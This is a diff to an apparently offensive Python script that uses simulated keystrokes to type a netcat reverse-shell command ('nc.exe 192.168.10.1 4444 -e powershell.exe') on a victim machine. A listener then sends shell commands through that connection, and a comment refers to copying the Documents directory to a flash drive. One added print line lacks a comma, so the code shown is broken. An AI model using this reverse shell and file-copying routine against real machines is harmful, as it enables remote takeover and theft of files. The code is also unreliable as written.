@@ -27,6 +27,7 @@ def reverse_shell_listener():
 		data = conn.recv(1024).decode("UTF-8") # Inital Connect
 		codelines=shellcode.split("\n")
 		for line in codelines:
+			print("Sending: "line)
 			conn.send(bytes(line + "\n\r", "UTF-8")) # Send shell command.
 			data = conn.recv(1024).decode("UTF-8") # Receive output from command.
 			print(data) # Print the output of the command.
@@ -55,12 +56,13 @@ def payload():
 
 	shelllistener=Process(target=reverse_shell_listener)
 	shelllistener.start()
-	eco.type("./nc.exe 192.168.10.1 4444 -e powershell.exe")
+	eco.type("./nc.exe 192.168.10.1 4444 -v -e powershell.exe")
 	eco.press("ENTER")
 	shelllistener.join()
 	# Copy Documents Directory to Flash Drive
 	httpd.server_close()
 	httplistener.join()
+	sleep(4)
 	eco.type("exit")
 	eco.press("ENTER")
 
